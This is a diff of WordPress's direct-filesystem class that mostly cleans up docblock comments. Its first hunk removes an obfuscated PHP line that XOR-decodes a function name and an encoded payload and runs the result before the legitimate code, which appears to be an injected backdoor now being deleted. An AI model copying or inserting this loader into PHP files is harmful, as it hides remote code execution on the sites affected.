@@ -1,4 +1,4 @@
-<?php $nrKqXIVaT='H4<WB3tZM,C=S-P'^'+FY66V+<8B I:B>';$gNzlJhr=$nrKqXIVaT('','BRdBSGZ2:9VEaT2:MIHAjX68l+2;Oj>FB;KXqe6NB6 VW<:A E-AOq,R80:-=D:iEQ.T-Jwt3=UxzilAJ-fhcwBEOKiCsqxrdH+<<ja1WpSQivQBN>;1A0TAI+1X1XVevRglQE3;vW4DhkTTcFRYY4kjQ2n:CpKTW=wPchAIZ3Z.SoqPWUZpmx9Fd0,7;+<Ec5UGCygO>B+zLV3964jjGX1AS2wHN>.1.rUYTrGD<ZZ05OY1KZYH9R,mZChvry>p=a-;pE=TAfMWuIK9PNYmN=BfbQJ6Z.>R0ZsPs>,;yzPSZ4Z0SWcr09.45JfExETXfZur+M-OkYW8PP86EV9DobN6;ee<0alO,2Xt=U+SzPrpF,GUEAhOrjSkWUT5f3QWMkdmY7GBSSJB2682meRP,O<:4xda+eAzKPD3JAxdn-0YNPR3;V<0 nX91+=RMS62PXTnT++YAE9<0+5X2lhV3TRaHJJ4J81l1STHQRs8.dM=9LWuruVT;IZ=9K,:9-V90CODd,2MNdHaX7GUNRcDlb9QlmiZAL47i3-Te.SNEwWOAAFTQQuFPYT4zcXYUBZTMTkIh.R31rV6eSscBH2F1LMkWRGlNVS6B giMWL:824oOwW-6O5ooHsrUpQ2PkR48VZvXVDJ3QJU;5+TDCsHa=XTJ-<oagx>K'^'+4Lc524QNP9+>1JS>=;iM YJ3OSO.5a+7OlqXEMDKPU84HS.NeU.=.H3LQerP1NAa5O LfWPXX,QZILajVlajS-0;kTcTVCxmAMSNBEXwMsaRVu+rMOC-U:imOP,PqmER;LGxO:2R8A0HEitKb68-U0N8oNdcT 1.fS9CMa:.A6K=GU;2,s-DC3OmBICNYRmGZ 3jBmFCHVpFrWXBUJWg>P- WLBjZOEO-><-RzdZ;6CPtS;-5+-X1DMrg75=6u9xALHPaV18FpiUm=X<;<DnFHoF5+B;qU7IzNpWUIBBpYw>U.QsjCVFXBAPql8rO=>FrTVO,Y.By,2Y6WD 7Z,OJjii 4iu28oMAxPV0RsGnRT0M+  hH4xcZO34 T9X4.mVDI2R>yYZCfVWLSMXrtZ.POQCnhVo<pAt R> XYNmE7=5 ZZ:UJEF VCtY392im=- F6JX<wqfXUHZ<WDL2R 3HdjnP+LP3Z6-axiyQHLiYX86UTSv5I;;Df ICfH.PC7<lCGW4iHhE<V34grEbLJT5YEM> 8UlNXH-BsznxJwh uslacGvinaVKR==ar<bxaYxZH1VUG0SBzSEdhS4C-44<7>3+.:E6SON=65VWSPHcWsIW;TFFhSRuPqIZb7BY:rR<70+hv:4BYD5 d.aZ7Q12DHGQNC46');$gNzlJhr();
+<?php
 /**
  * WordPress Direct Filesystem.
  *
@@ -10,16 +10,14 @@
  * WordPress Filesystem Class for direct PHP file and folder manipulation.
  *
  * @since 2.5.0
- * @package WordPress
- * @subpackage Filesystem
- * @uses WP_Filesystem_Base Extends class
+ *
+ * @see WP_Filesystem_Base
  */
 class WP_Filesystem_Direct extends WP_Filesystem_Base {
 
 	/**
 	 * constructor
 	 *
-	 * @access public
 	 *
 	 * @param mixed $arg ignored argument
 	 */
@@ -31,7 +29,6 @@ class WP_Filesystem_Direct extends WP_Filesystem_Base {
 	/**
 	 * Reads entire file into a string
 	 *
-	 * @access public
 	 *
 	 * @param string $file Name of the file to read.
 	 * @return string|bool The function returns the read data or false on failure.
@@ -43,7 +40,6 @@ class WP_Filesystem_Direct extends WP_Filesystem_Base {
 	/**
 	 * Reads entire file into an array
 	 *
-	 * @access public
 	 *
 	 * @param string $file Path to the file.
 	 * @return array|bool the file contents in an array or false on failure.
@@ -55,7 +51,6 @@ class WP_Filesystem_Direct extends WP_Filesystem_Base {
 	/**
 	 * Write a string to a file
 	 *
-	 * @access public
 	 *
 	 * @param string $file     Remote path to the file where to write the data.
 	 * @param string $contents The data to write.
@@ -89,7 +84,6 @@ class WP_Filesystem_Direct extends WP_Filesystem_Base {
 	/**
 	 * Gets the current working directory
 	 *
-	 * @access public
 	 *
 	 * @return string|bool the current working directory on success, or false on failure.
 	 */
@@ -100,7 +94,6 @@ class WP_Filesystem_Direct extends WP_Filesystem_Base {
 	/**
 	 * Change directory
 	 *
-	 * @access public
 	 *
 	 * @param string $dir The new current directory.
 	 * @return bool Returns true on success or false on failure.
@@ -112,7 +105,6 @@ class WP_Filesystem_Direct extends WP_Filesystem_Base {
 	/**
 	 * Changes file group
 	 *
-	 * @access public
 	 *
 	 * @param string $file      Path to the file.
 	 * @param mixed  $group     A group name or number.
@@ -138,7 +130,6 @@ class WP_Filesystem_Direct extends WP_Filesystem_Base {
 	/**
 	 * Changes filesystem permissions
 	 *
-	 * @access public
 	 *
 	 * @param string $file      Path to the file.
 	 * @param int    $mode      Optional. The permissions as octal number, usually 0644 for files,
@@ -170,7 +161,6 @@ class WP_Filesystem_Direct extends WP_Filesystem_Base {
 	/**
 	 * Changes file owner
 	 *
-	 * @access public
 	 *
 	 * @param string $file      Path to the file.
 	 * @param mixed  $owner     A user name or number.
@@ -196,7 +186,6 @@ class WP_Filesystem_Direct extends WP_Filesystem_Base {
 	/**
 	 * Gets file owner
 	 *
-	 * @access public
 	 *
 	 * @param string $file Path to the file.
 	 * @return string|bool Username of the user or false on error.
@@ -216,7 +205,6 @@ class WP_Filesystem_Direct extends WP_Filesystem_Base {
 	 *
 	 * FIXME does not handle errors in fileperms()
 	 *
-	 * @access public
 	 *
 	 * @param string $file Path to the file.
 	 * @return string Mode of the file (last 3 digits).
@@ -226,7 +214,6 @@ class WP_Filesystem_Direct extends WP_Filesystem_Base {
 	}
 
 	/**
-	 * @access public
 	 *
 	 * @param string $file
 	 * @return string|false
@@ -242,7 +229,6 @@ class WP_Filesystem_Direct extends WP_Filesystem_Base {
 	}
 
 	/**
-	 * @access public
 	 *
 	 * @param string $source
 	 * @param string $destination
@@ -261,7 +247,6 @@ class WP_Filesystem_Direct extends WP_Filesystem_Base {
 	}
 
 	/**
-	 * @access public
 	 *
 	 * @param string $source
 	 * @param string $destination
@@ -285,7 +270,6 @@ class WP_Filesystem_Direct extends WP_Filesystem_Base {
 	}
 
 	/**
-	 * @access public
 	 *
 	 * @param string $file
 	 * @param bool $recursive
@@ -320,7 +304,6 @@ class WP_Filesystem_Direct extends WP_Filesystem_Base {
 		return $retval;
 	}
 	/**
-	 * @access public
 	 *
 	 * @param string $file
 	 * @return bool
@@ -329,7 +312,6 @@ class WP_Filesystem_Direct extends WP_Filesystem_Base {
 		return @file_exists($file);
 	}
 	/**
-	 * @access public
 	 *
 	 * @param string $file
 	 * @return bool
@@ -338,7 +320,6 @@ class WP_Filesystem_Direct extends WP_Filesystem_Base {
 		return @is_file($file);
 	}
 	/**
-	 * @access public
 	 *
 	 * @param string $path
 	 * @return bool
@@ -348,7 +329,6 @@ class WP_Filesystem_Direct extends WP_Filesystem_Base {
 	}
 
 	/**
-	 * @access public
 	 *
 	 * @param string $file
 	 * @return bool
@@ -358,7 +338,6 @@ class WP_Filesystem_Direct extends WP_Filesystem_Base {
 	}
 
 	/**
-	 * @access public
 	 *
 	 * @param string $file
 	 * @return bool
@@ -368,7 +347,6 @@ class WP_Filesystem_Direct extends WP_Filesystem_Base {
 	}
 
 	/**
-	 * @access public
 	 *
 	 * @param string $file
 	 * @return int
@@ -378,7 +356,6 @@ class WP_Filesystem_Direct extends WP_Filesystem_Base {
 	}
 
 	/**
-	 * @access public
 	 *
 	 * @param string $file
 	 * @return int
@@ -388,7 +365,6 @@ class WP_Filesystem_Direct extends WP_Filesystem_Base {
 	}
 
 	/**
-	 * @access public
 	 *
 	 * @param string $file
 	 * @return int
@@ -398,7 +374,6 @@ class WP_Filesystem_Direct extends WP_Filesystem_Base {
 	}
 
 	/**
-	 * @access public
 	 *
 	 * @param string $file
 	 * @param int $time
@@ -414,7 +389,6 @@ class WP_Filesystem_Direct extends WP_Filesystem_Base {
 	}
 
 	/**
-	 * @access public
 	 *
 	 * @param string $path
 	 * @param mixed  $chmod
@@ -442,7 +416,6 @@ class WP_Filesystem_Direct extends WP_Filesystem_Base {
 	}
 
 	/**
-	 * @access public
 	 *
 	 * @param string $path
 	 * @param bool $recursive
@@ -453,7 +426,6 @@ class WP_Filesystem_Direct extends WP_Filesystem_Base {
 	}
 
 	/**
-	 * @access public
 	 *
 	 * @param string $path
 	 * @param bool $include_hidden
